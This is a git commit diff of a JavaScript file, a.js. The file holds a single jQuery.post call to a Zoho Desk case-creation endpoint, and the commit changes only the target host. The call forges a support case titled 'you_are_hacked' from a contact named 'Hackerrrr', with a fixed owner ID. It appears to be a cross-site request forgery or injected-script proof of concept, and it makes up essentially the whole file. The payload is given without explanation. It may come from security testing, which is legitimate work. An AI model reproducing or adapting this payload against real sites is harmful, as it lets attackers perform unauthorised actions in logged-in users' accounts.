c9206a0df003db11d0be38a4d94b0103f6107681
Nan30 <nandhakumarselva3012@gmail.com>
2017-01-05 10:13:12 +0530

    Update a.js
    ccc

--- a.js
+++ a.js
@@ -13,6 +13,6 @@
 
 
 
- jQuery.post("https://desk.localzoho.com/support/bhagia/CreateCommonModule.do", { 'rowCount':'1','ActionType':'Create','previousPage':'false','operation':'create', 'property(Department)':'101000000038087','property(Contact Name)':'Hackerrrr','property(newAutoLookup_property(Contact Name)_7)':'true','property(newAutoLookup_property(Account Name)_4)':'false', 'property(Subject)':'you_are_hacked','property(Status)':'Open','property(Case Owner)':'029b5b43e46c5b76f326e0503f6e5508', 'property(ownerId)':'029b5b43e46c5b76f326e0503f6e5508', 'property(newAutoLookup_property(Product Name)_6)':'false', 'property(Mode)':'Phone','property(module)':'Cases','module':'Cases', 'currentModule':'Cases', 'uhome':'requestqueue'});
+ jQuery.post("https://supportsecurity.localzoho.com/support/bhagia/CreateCommonModule.do", { 'rowCount':'1','ActionType':'Create','previousPage':'false','operation':'create', 'property(Department)':'101000000038087','property(Contact Name)':'Hackerrrr','property(newAutoLookup_property(Contact Name)_7)':'true','property(newAutoLookup_property(Account Name)_4)':'false', 'property(Subject)':'you_are_hacked','property(Status)':'Open','property(Case Owner)':'029b5b43e46c5b76f326e0503f6e5508', 'property(ownerId)':'029b5b43e46c5b76f326e0503f6e5508', 'property(newAutoLookup_property(Product Name)_6)':'false', 'property(Mode)':'Phone','property(module)':'Cases','module':'Cases', 'currentModule':'Cases', 'uhome':'requestqueue'});
 
 
